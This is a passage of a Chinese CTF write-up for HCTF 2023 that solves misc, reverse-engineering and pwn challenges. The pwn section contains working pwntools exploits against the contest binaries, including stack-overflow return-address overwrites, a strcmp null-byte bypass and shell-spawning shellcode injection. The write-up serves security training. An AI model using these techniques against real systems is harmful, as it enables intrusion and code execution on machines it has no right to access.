class="mi">121</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">125</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将ASCII码转换为字符</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">ascii_list</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></div><p>得到<code>hctf{Base_F@m1y_4re_Vari0us}</code></p>
+<h4 id="3bomb">3.Bomb<a hidden class="anchor" aria-hidden="true" href="#3bomb">#</a></h4>
+<p>先用nc连接，然后多尝试几次发现炸弹的分布比较固定，对照着通关即可拿到flag</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/26/MdsI9BN5WwvOEZe.png" alt="image.png"  />
+</p>
+<h3 id="二re">二、Re<a hidden class="anchor" aria-hidden="true" href="#二re">#</a></h3>
+<h4 id="1sdu的第一张考卷">1.SDU的第一张考卷<a hidden class="anchor" aria-hidden="true" href="#1sdu的第一张考卷">#</a></h4>
+<p>将附件用 IDA pro打开</p>
+<img src="https://s2.loli.net/2023/08/26/AsGylMmHegRkiT8.png" alt="image.png" style="zoom: 50%;" />
+<p>main函数里就有答案，最后一题需要猜，最多猜4次嘛（）</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/26/HiZoXG5kv1jF2eT.png" alt="image.png"  />
+</p>
+<p>flag：<code>HCTF{ACCBDAADBB}</code></p>
+<h4 id="2-xor">2. XOR<a hidden class="anchor" aria-hidden="true" href="#2-xor">#</a></h4>
+<p>一个简单的异或，告诉了我们enc数组和密钥key，将enc数组中的元素与key逐位异或即可</p>
+<p>写出py脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">enc</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span><span class="mi">93</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">17</span> <span class="p">,</span><span class="mi">40</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">98</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;HCTF2023&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xor_result</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">xor_result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><p>输出为：<code>X0r_1s_A_V3ry_Sign1ficant_Too1_In_Encrypt!</code></p>
+<p>flag：<code>HCTF{X0r_1s_A_V3ry_Sign1ficant_Too1_In_Encrypt!}</code></p>
+<h4 id="3maze">3.Maze<a hidden class="anchor" aria-hidden="true" href="#3maze">#</a></h4>
+<p>放入IDA阅读代码</p>
+<img src="https://s2.loli.net/2023/08/26/MNI32JYAZu4wj9S.png" alt="image.png" style="zoom:80%;" />
+<p>flag要进入一个check函数，我们继续阅读check函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">strcpy</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">maze</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;********************U..**************.****..O*****...****.*******.******.*******........********************************&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">init_location</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">19</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v1</span> <span class="o">=</span> <span class="n">count</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[</span><span class="n">v1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">100</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="o">++</span><span class="n">init_location</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">115</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">init_location</span> <span class="o">+=</span> <span class="mi">15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">119</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">init_location</span> <span class="o">-=</span> <span class="mi">15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">97</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="o">--</span><span class="n">init_location</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">maze</span><span class="p">[</span><span class="n">init_location</span><span class="p">]</span> <span class="o">==</span> <span class="mi">79</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>v2有wasd四种情况，想到上下左右四个方向</p>
+<p>a 和 d 分别是位置-1和位置+1</p>
+<p>而 w 和 s 是-15和+15</p>
+<p>如果w s是向上下方向走的，则不难推出迷宫的规格为15×15</p>
+<p>根据给出的字符串画出迷宫</p>
+<pre tabindex="0"><code>***************
+*****U..*******
+*******.****..O
+*****...****.**
+*****.******.**
+*****........**
+***************
+***************
+</code></pre><p>代码里描述了起始位置为U，终点为O，则需要的操作为：</p>
+<p><code>ddssaassdddddddwwwdd</code></p>
+<p>flag:<code>HCTF{ddssaassdddddddwwwdd}</code></p>
+<h3 id="三pwn">三、pwn<a hidden class="anchor" aria-hidden="true" href="#三pwn">#</a></h3>
+<h4 id="1gift">1、gift<a hidden class="anchor" aria-hidden="true" href="#1gift">#</a></h4>
+<p>nc连接即可</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/26/8y6gnTiCNBArYZW.png" alt="image.png"  />
+</p>
+<h4 id="2fly">2、Fly<a hidden class="anchor" aria-hidden="true" href="#2fly">#</a></h4>
+<p>先checksec一下</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/26/qKhNlteI3oWs1wX.png" alt="image.png"  />
+</p>
+<p>64位且可以进行栈溢出</p>
+<p>然后我们阅读程序代码</p>
+<img src="https://s2.loli.net/2023/08/26/Uxozdwgk74JF6y1.png" alt="image.png" style="zoom: 67%;" />
+<p>read函数可以进行栈溢出，但进入if中我们需要找到一个字符使它的ASCII码值为-105</p>
+<p>关于ASCII码为负值的原因可以参考：</p>
+<p><a href="https://blog.csdn.net/kelehaier/article/details/59560419">https://blog.csdn.net/kelehaier/article/details/59560419</a></p>
+<p>据此我们可以计算出实际的ASCII码为151</p>
+<p>然后我们查看buf的栈</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/27/oZCVuwE7NTe9pmA.png" alt="image.png"  />
+</p>
+<p>起始地址为0xD0</p>
+<p>溢出值为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0xD0</span><span class="o">+</span><span class="mh">0x08</span>
+</span></span></code></pre></div><p>找到后门函数</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/27/mXB8cdopMFjIftT.png" alt="image.png"  />
+</p>
+<p>后门函数起始地址为：<img loading="lazy" src="https://s2.loli.net/2023/08/27/IioqS4Zz1C7RaH5.png" alt="image.png"  />
+</p>
+<p>构造payload为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">offset</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40086E</span><span class="p">)</span>
+</span></span></code></pre></div><p>exp:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;10.102.32.142&#34;</span><span class="p">,</span> <span class="mi">23961</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ch</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">151</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0xD0</span><span class="o">+</span><span class="mh">0x08</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">offset</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40086E</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>成功拿到shell</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/27/EFV5WR7sz1D2LHi.png" alt="image.png"  />
+</p>
+<h4 id="3sdu_l0g1n">3.sdu_L0g1n<a hidden class="anchor" aria-hidden="true" href="#3sdu_l0g1n">#</a></h4>
+<p>同样先checksec一下</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/27/buOJgRkDo2BMl8f.png" alt="image.png"  />
+</p>
+<p>同样是64位且未开启栈保护</p>
+<p>拖进IDA分析程序</p>
+<img src="https://s2.loli.net/2023/08/27/luD42qgBhPOQMjb.png" alt="image.png" style="zoom:67%;" />
+<p>发现有两次strcmp检测，我们需要绕过strcmp检测</p>
+<p>可以通过后面加<code>\x00</code>的方法绕过</p>
+<p>找到后门函数：</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/27/y6vwijpPLkDYfWM.png" alt="image.png"  />
+</p>
+<p>观察程序结构，我们可以考虑从main函数通过read的栈溢出溢出到后门函数的位置，这样就可以劫持后门函数获取shell权限</p>
+<p>经过反复调试，exp为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;10.102.32.142&#34;</span><span class="p">,</span> <span class="mi">26613</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x40</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;SDUpwner</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;N1nEmAN is C.o0O0OOOOL!</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4006C6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://s2.loli.net/2023/08/27/I1tjYZfiCwMGqpX.png" alt="image.png"  />
+</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/08/27/YlBCmAEDbTkpXs2.png" alt="image.png"  />
+</p>
+<h4 id="4rdshellcode">4.rdshellcode<a hidden class="anchor" aria-hidden="true" href="#4rdshellcode">#</a></h4>
+<p>打开附件，观察main函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-70h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-8h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+6Ch] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;I&#39;m glad that you choose pwn&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;But i am n0t sure you really love pwn or not&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Can&#39;t you prove yourself?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Tell me something....&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">srand</span><span class="p">(</span><span class="mh">0x2023u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">60</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You DO Not Really Love PWN !&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Nice!!!!, you have proved your love for pwn&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;It&#39;s time for me: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Dot&#39; you want to make friends with me?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><code>v6</code>实际上是一个伪随机数，一直为-59，我们让<code>v5</code>的值为-59即可
+然后程序会输出一个地址
+<img loading="lazy" src="https://s2.loli.net/2023/09/23/dbVhnDiOT2l9pHL.png" alt="image.png"  />
+</p>
+<p>发现地址是随机化的，所以我们要用pwntools里的内置函数读取printf出的buf的地址</p>
+<p>exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;10.102.32.142&#34;</span><span class="p">,</span><span class="mi">27714</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-59&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#shellcode = b&#39;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># shellcode = &#39;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x70</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>  <span class="o">+</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>buf的栈深度是0x70，64位程序＋8，后面再＋8是shellcode地址的长度，于是我们可以得到如下模板</p>
+<hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">栈深度</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">栈地址</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>  <span class="o">+</span> <span class="n">shellcode</span>
+</span></span></code></pre></div><p>shellcode我们可以用pwntools生成</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span></code></pre></div><p>运行exp得到flag</p>
+<h4 id="5fleshman">5.fleshman<a hidden class="anchor" aria-hidden="true" href="#5fleshman">#</a></h4>
+<p>main函数如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;We1c0me t0 SDU! Since y0u are f1esh here,te11 me s0mething ab0ut Y0u:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your ID: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x28uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;pwnner&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Nice t0 mEEt y0u %s&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">getflag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
